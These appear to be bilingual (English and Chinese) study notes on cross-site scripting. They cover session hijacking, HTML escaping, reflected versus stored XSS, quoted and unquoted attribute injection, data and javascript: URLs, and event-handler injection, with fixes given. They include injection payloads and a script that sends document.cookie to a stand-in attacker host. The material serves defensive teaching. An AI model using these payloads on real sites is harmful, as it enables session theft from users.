#### Session hijacking with XSS (Cross-Site Scripting)

Don't trust any user input or even GET query parameter. Crafted link `target.com:4000/source=<script>alert(document.cookie)</script>`.

What if website is vulnerable to XSS?
- Attacker can insert their code into the webpage
- At this point, they can easily exfiltrate the user's cookie

```html
<script>
  new Image().src = 'https://attacker/com/steal?=cookie=' + document.cookie
</script>
```
#### Escaping

HTML转义：在HTML中，某些字符需要被转义，以防止它们被浏览器解释为HTML代码的一部分。例如，小于号 `<` 需要被转义为 `&lt;`，以防止它被解释为一个标签的开始。
```html
<p>Here is a less than symbol: &lt;</p>
```

#### Reflected v.s. Stored XSS
In reflected XSS, the attacker code is placed into the HTTP request itself; In stored XSS, the attacker code is presisted into the database.

#### HTML attributes
```html
<img src='avatar.png' alt='USER_DATA_HERE' />
```
User input: `Feross' onload='alert(document.cookie)`
Resulting page
```html
<img src='avatar.png' alt='Feross' onload='alert(document.cookie)' />
```
What is the fix? Change all `'` to `&apos;`, change all `"` to `&quot;`

#### HTML attributes without quotes
不加引号是合法的，只是此时属性的值里不能有空格和`%, *, +, -, /, ;, <, =, >, ^, |`等 
```html
<img src=avatar.png alt=USER_DATA_HERE />
```
现在怎么防御XSS呢？还是得always quote attributes.

#### Data URL, `javascript:` attributes

Data URL, https://developer.mozilla.org/zh-CN/docs/Web/URI/Schemes/data
```
data:[<mediatype>][;base64],<data>
```
e.g.
```
data:text/html, <script>alert(1)</script>
```
在Firefox地址栏中粘贴`javascript:alert(1)`回车直接strip掉`javascript:`，手写`javascript:alert(1)`没有反应。在Chrome地址栏中粘贴会直接strip掉`javascript:`。Safari doesn't allow JavaScript from the Smart Search Field.
```
data:text/html, <svg onload=javascript:alert(1)>
```

#### on* attributes
```html
<div onmouseover='handleHover(USER_DATA_HERE)'>
```
Escaping `'` and `"` is not enough here.
Attacker input: `); alert(document.cookie`
```html
<div onmouseover='handleHover(); alert(document.cookie)'>
```
